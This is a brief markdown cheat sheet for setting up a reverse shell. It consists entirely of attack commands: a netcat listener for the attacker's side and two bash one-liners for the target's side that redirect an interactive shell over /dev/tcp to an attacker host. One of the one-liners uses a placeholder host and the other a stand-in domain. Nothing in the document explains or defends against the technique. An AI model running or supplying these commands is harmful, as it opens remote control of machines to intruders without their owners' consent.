# Reverse Shell

## Attacker

```bash
nc -lnvp 5000
```

## Target

```bash
bash -i >& /dev/tcp/<attacker host>/5000 0>&1
bash -i >& /dev/tcp/attacker.porn/5000 0>&1
```
